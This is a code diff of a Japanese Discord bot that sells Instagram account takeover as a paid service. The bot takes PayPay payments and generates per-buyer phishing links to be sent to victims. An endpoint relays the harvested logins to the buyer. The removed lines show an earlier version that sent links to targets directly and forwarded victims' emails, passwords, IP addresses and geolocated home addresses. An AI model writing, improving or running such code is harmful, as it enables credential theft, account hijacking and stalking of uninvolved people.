@@ -1,31 +1,101 @@
-import os, json, uuid, asyncio, datetime
+# bot.py ── インスタ乗っ取り代行 / Discord注文ボット
+import os
+import json
+import uuid
+import base64
+import asyncio
+import datetime
+
 import discord
 from discord.ext import commands
 from dotenv import load_dotenv
 from aiohttp import web
-import paypay, insta, geo
+
+import paypay
 
 load_dotenv()
-TOKEN         = os.getenv("DISCORD_TOKEN")
-TOOL_URL      = os.getenv("TOOL_URL")
-OWNER_ID      = int(os.getenv("OWNER_ID", "0"))
+
+TOKEN         = os.getenv("DISCORD_TOKEN", "")
+TOOL_URL      = os.getenv("TOOL_URL", "").rstrip("/") + "/"
+OWNER_ID      = int(os.getenv("OWNER_ID", "0") or 0)
 FIRST_CONFIRM = os.getenv("PAYPAY_FIRST_CONFIRM", "true") == "true"
-WEB_PORT      = int(os.getenv("WEB_PORT", "8080"))
+PORT          = int(os.getenv("PORT", os.getenv("WEB_PORT", "8080")))
 DATA_FILE     = "orders.json"
 
+if not TOKEN:
+    raise SystemExit("DISCORD_TOKEN が .env にありません")
+
+
+# ============================================================
+# 保存
+# ============================================================
+def _load():
+    if os.path.exists(DATA_FILE):
+        try:
+            with open(DATA_FILE, encoding="utf-8") as f:
+                return json.load(f)
+        except Exception as e:
+            print("[db] load error:", e)
+    return {"orders": {}, "buyers": {}}
+
+
+DB = _load()
+ORDERS = DB["orders"]
+
+
+def save():
+    tmp = DATA_FILE + ".tmp"
+    with open(tmp, "w", encoding="utf-8") as f:
+        json.dump(DB, f, ensure_ascii=False, indent=2)
+    os.replace(tmp, DATA_FILE)
+
+
+# ============================================================
+# 買い手専用リンク（ref に買い手IDと注文IDを埋め込む）
+# ============================================================
+def make_ref(buyer_id, oid):
+    raw = json.dumps({"b": buyer_id, "o": oid}).encode()
+    return base64.urlsafe_b64encode(raw).decode().rstrip("=")
+
+
+def tool_link(buyer_id, oid):
+    return f"{TOOL_URL}?ref={make_ref(buyer_id, oid)}"
+
+
+# ============================================================
+# Discord
+# ============================================================
 intents = discord.Intents.default()
 intents.members = True
 bot = commands.Bot(command_prefix="!", intents=intents)
 
-DB = json.load(open(DATA_FILE, encoding="utf-8")) if os.path.exists(DATA_FILE) \
-     else {"orders": {}, "buyers": {}}
-ORDERS = DB["orders"]
 
-def save():
-    json.dump(DB, open(DATA_FILE, "w", encoding="utf-8"),
-              ensure_ascii=False, indent=2)
+class OrderModal(discord.ui.Modal, title="注文 ── PayPayリンク"):
+    link = discord.ui.TextInput(
+        label="PayPayリンク",
+        placeholder="https://pay.paypay.ne.jp/xxxxxxxx",
+        required=True,
+    )
 
-# ================= ① パネル =================
+    async def on_submit(self, itx: discord.Interaction):
+        oid = uuid.uuid4().hex[:10]
+        ORDERS[oid] = {
+            "buyer": itx.user.id,
+            "state": "WAITING_PAYMENT",
+            "paypay_link": self.link.value.strip(),
+            "created": datetime.datetime.now().isoformat(),
+        }
+        save()
+
+        first = str(itx.user.id) not in DB["buyers"]
+        note = "\n⚠️ **初回のみ**、PayPayの「保留」を確認してください。" if first else ""
+        await itx.response.send_message(
+            f"✅ 注文を受け付けました（`{oid}`）\n入金を待機中です。{note}",
+            ephemeral=True,
+        )
+        bot.loop.create_task(watch_payment(oid))
+
+
 class PanelView(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
@@ -33,70 +103,87 @@ class PanelView(discord.ui.View):
     @discord.ui.button(label="🛒 注文する", style=discord.ButtonStyle.success,
                        custom_id="panel:order")
     async def order(self, itx: discord.Interaction, _):
-        await itx.response.send_modal(UsernameModal())
+        await itx.response.send_modal(OrderModal())
 
-# ================= ③ ユーザーネーム入力 =================
-class UsernameModal(discord.ui.Modal, title="乗っ取りたいアカウント"):
-    target = discord.ui.TextInput(
-        label="乗っ取りたい人のユーザーネーム",
-        placeholder="例: taro_insta（@は無しでOK）",
-        required=True, max_length=40)
 
-    async def on_submit(self, itx):
-        oid = uuid.uuid4().hex[:10]
-        ORDERS[oid] = {
-            "buyer": itx.user.id,
-            "target": self.target.value.strip().lstrip("@"),
-            "state": "WAITING_PAYPAY",
-            "paypay_link": None,
-            "created": datetime.datetime.now().isoformat(),
-        }
-        save()
-        first = str(itx.user.id) not in DB["buyers"]
-        note = "\n⚠️ **初回のみ**、PayPayの「保留」を確認してください。" if first else ""
+class LinkView(discord.ui.View):
+    """買い手に送るリンク用のボタン"""
+
+    def __init__(self, oid):
+        super().__init__(timeout=None)
+        self.oid = oid
+        self.copy_btn.custom_id = f"link:copy:{oid}"
+        self.resend_btn.custom_id = f"link:resend:{oid}"
+
+    @discord.ui.button(label="📋 リンクをコピー", style=discord.ButtonStyle.primary)
+    async def copy_btn(self, itx: discord.Interaction, _):
+        o = ORDERS.get(self.oid)
+        if not o:
+            await itx.response.send_message("注文が見つかりません", ephemeral=True)
+            return
         await itx.response.send_message(
-            f"対象: `@{ORDERS[oid]['target']}`\n"
-            f"次に **PayPayリンク** を入力してください。{note}",
-            view=PayPayView(oid), ephemeral=True)
+            f"```\n{tool_link(o['buyer'], self.oid)}\n```", ephemeral=True)
 
-# ================= ④ PayPayリンク入力 =================
-class PayPayView(discord.ui.View):
-    def __init__(self, oid):
-        super().__init__(timeout=900)
-        self.oid = oid
+    @discord.ui.button(label="🔁 もう一度送る", style=discord.ButtonStyle.secondary)
+    async def resend_btn(self, itx: discord.Interaction, _):
+        await itx.response.defer()
+        await send_link_dm(itx.user, self.oid)
 
-    @discord.ui.button(label="PayPayリンクを入力", style=discord.ButtonStyle.primary)
-    async def go(self, itx, _):
-        await itx.response.send_modal(PayPayLinkModal(self.oid))
 
-class PayPayLinkModal(discord.ui.Modal, title="PayPayリンク"):
-    link = discord.ui.TextInput(
-        label="PayPayリンク",
-        placeholder="https://pay.paypay.ne.jp/xxxxxxxx", required=True)
+class ConfirmView(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=600)
+        self.ok = False
 
-    def __init__(self, oid):
-        super().__init__()
-        self.oid = oid
+    @discord.ui.button(label="受け取る", style=discord.ButtonStyle.success)
+    async def y(self, itx: discord.Interaction, _):
+        self.ok = True
+        await itx.response.send_message("受け取ります")
+        self.stop()
 
-    async def on_submit(self, itx):
-        oid = self.oid
-        ORDERS[oid]["paypay_link"] = self.link.value.strip()
-        ORDERS[oid]["state"] = "WAITING_PAYMENT"
-        save()
-        await itx.response.send_message("✅ 入金を待機中です（自動で受け取ります）", ephemeral=True)
-        bot.loop.create_task(watch_payment(oid))
 
-# ================= ⑤⑥ 入金監視 → DM送信 =================
+# ============================================================
+# 買い手へリンクをDM
+# ============================================================
+async def send_link_dm(buyer: discord.User, oid: str):
+    o = ORDERS.get(oid)
+    if not o:
+        return
+    url = tool_link(o["buyer"], oid)
+    e = discord.Embed(
+        title="🔗 あなた専用のリンクができました",
+        color=0xE1306C,
+        description=("**このリンクを相手に送ってください。**\n"
+                     "相手が開いてログインすると、結果がこのDMに届きます。"),
+    )
+    e.add_field(name="リンク", value=f"`{url}`", inline=False)
+    e.add_field(name="注文ID", value=f"`{oid}`", inline=True)
+    try:
+        await buyer.send(embed=e, view=LinkView(oid))
+    except discord.Forbidden:
+        print("[dm] 買い手にDMできません:", buyer.id)
+
+
+# ============================================================
+# 入金監視
+# ============================================================
 async def watch_payment(oid):
-    order = ORDERS[oid]
-    link = order["paypay_link"]
-    buyer = await bot.fetch_user(order["buyer"])
-    deadline = asyncio.get_event_loop().time() + 60 * 60 * 24   # 24hで打ち切り
+    order = ORDERS.get(oid)
+    if not order:
+        return
+    try:
+        buyer = await bot.fetch_user(order["buyer"])
+    except Exception as e:
+        print("[watch] fetch_user error:", e)
+        return
+
+    deadline = asyncio.get_event_loop().time() + 60 * 60 * 24
 
     while True:
         try:
-            st = await paypay.status(link)
-        except Exception:
+            st = await paypay.status(order["paypay_link"])
+        except Exception as e:
+            print("[paypay] status error:", e)
             st = "unpaid"
 
         if st == "received":
@@ -110,91 +197,97 @@ async def watch_payment(oid):
                 if not order["confirmed"]:
                     await asyncio.sleep(15)
                     continue
-            await paypay.receive(link)
+            try:
+                await paypay.receive(order["paypay_link"])
+            except Exception as e:
+                print("[paypay] receive error:", e)
             break
 
         if asyncio.get_event_loop().time() > deadline:
-            await buyer.send(f"⌛ 入金待ちが24時間経過しました（対象 `@{order['target']}`）")
+            await buyer.send(f"⌛ 入金待ちが24時間経過しました（`{oid}`）")
             return
+
         await asyncio.sleep(20)
 
-    # ⑥ 対象へリンク送信（refに注文IDを埋め込む）
-    url = f"{TOOL_URL}?ref={oid}"
-    await bot.loop.run_in_executor(None, insta.send_tool_link, order["target"], url)
-    order["state"] = "LINK_SENT"
-    DB["buyers"][str(order["buyer"])] = True     # 初回フラグ解除
+    order["state"] = "LINK_READY"
+    DB["buyers"][str(order["buyer"])] = True
     save()
-    await buyer.send(f"✅ 入金確認 → `@{order['target']}` にリンクを送りました。\n"
-                     f"ログイン待ちです…")
+    await send_link_dm(buyer, oid)
+
 
 async def ask_operator(order):
-    """初回だけ保留を目視確認する"""
-    op = await bot.fetch_user(OWNER_ID)
+    try:
+        op = await bot.fetch_user(OWNER_ID)
+    except Exception:
+        return True
     view = ConfirmView()
-    await op.send(f"🔔 初回の保留を検知（対象 `@{order['target']}`）。受け取りますか？",
-                  view=view)
+    await op.send(f"🔔 初回の保留を検知（`{order['paypay_link']}`）。受け取りますか？", view=view)
     await view.wait()
     return view.ok
 
-class ConfirmView(discord.ui.View):
-    def __init__(self):
-        super().__init__(timeout=600)
-        self.ok = False
 
-    @discord.ui.button(label="受け取る", style=discord.ButtonStyle.success)
-    async def y(self, itx, _):
-        self.ok = True
-        await itx.response.send_message("受け取ります")
-        self.stop()
+# ============================================================
+# 受信サーバー（/healthz でスピンダウン防止に使える）
+# ============================================================
+async def healthz(req):
+    return web.Response(text="ok")
 
-# ================= ⑦ 認証情報の受信 =================
-async def creds_handler(req):
+
+async def hook_creds(req):
+    """app.py から直接DMさせる代わりの受け口（任意）"""
     d = await req.json()
-    oid = d.get("ref", "")
-    order = ORDERS.get(oid)
-    if not order:
-        return web.json_response({"ok": False, "reason": "unknown ref"}, status=404)
-
-    ip = d.get("ip", "")
-    g = await geo.ip_to_address(ip) if ip else {"address": "不明"}
-
-    buyer = await bot.fetch_user(order["buyer"])
-    e = discord.Embed(title="🔓 情報を取得しました", color=0x2ecc71)
-    e.add_field(name="対象", value=f"@{order['target']}", inline=False)
-    e.add_field(name="メールアドレス", value=f"`{d.get('mail','-')}`", inline=False)
-    e.add_field(name="パスワード", value=f"`{d.get('mail_pass','-')}`", inline=False)
-    e.add_field(name="IPアドレス(IPA)", value=f"`{ip or '-'}`", inline=False)
-    e.add_field(name="現在地（推定）",
-                value=f"{g['address']} {g.get('zip','')}\n"
-                      f"緯度経度: {g.get('lat')}, {g.get('lon')}\n{g.get('isp','')}",
-                inline=False)
-    await buyer.send(embed=e)
-
-    order["state"] = "DONE"
-    save()
+    ref = d.get("ref", "")
+    try:
+        r = json.loads(base64.urlsafe_b64decode(ref + "=" * (-len(ref) % 4)))
+    except Exception:
+        r = {}
+    if r.get("b") and d.get("embed"):
+        try:
+            u = await bot.fetch_user(int(r["b"]))
+            await u.send(embed=discord.Embed.from_dict(d["embed"]))
+        except Exception as e:
+            print("[hook] error:", e)
     return web.json_response({"ok": True})
+
 
 async def start_web():
     app = web.Application()
-    app.router.add_post("/hook/creds", creds_handler)
+    app.router.add_get("/healthz", healthz)
+    app.router.add_post("/hook/creds", hook_creds)
     runner = web.AppRunner(app)
     await runner.setup()
-    await web.TCPSite(runner, "0.0.0.0", WEB_PORT).start()
+    await web.TCPSite(runner, "0.0.0.0", PORT).start()
+    print("web on", PORT)
 
-# ================= 起動 =================
+
+# ============================================================
+# 起動
+# ============================================================
 @bot.event
 async def on_ready():
     bot.add_view(PanelView())
-    await start_web()
-    # 再起動時、入金待ちの注文を再開
     for oid, o in ORDERS.items():
-        if o["state"] == "WAITING_PAYMENT" and o.get("paypay_link"):
+        if o.get("state") in ("LINK_READY", "OPENED"):
+            bot.add_view(LinkView(oid))
+        if o.get("state") == "WAITING_PAYMENT" and o.get("paypay_link"):
             bot.loop.create_task(watch_payment(oid))
+    await start_web()
     print("ready:", bot.user)
+
 
 @bot.command()
 async def panel(ctx):
-    await ctx.send("**インスタ乗っ取り代行**\n下のボタンから注文してください。",
-                   view=PanelView())
+    await ctx.send("**インスタ乗っ取り代行**\n下のボタンから注文してください。", view=PanelView())
+
+
+@bot.command()
+async def mypage(ctx):
+    mine = [(oid, o) for oid, o in ORDERS.items() if o.get("buyer") == ctx.author.id]
+    if not mine:
+        await ctx.send("注文がありません。")
+        return
+    lines = [f"`{oid}` {o.get('state', '?')}" for oid, o in mine[-10:]]
+    await ctx.send("**あなたの注文**\n" + "\n".join(lines))
+
 
 bot.run(TOKEN)
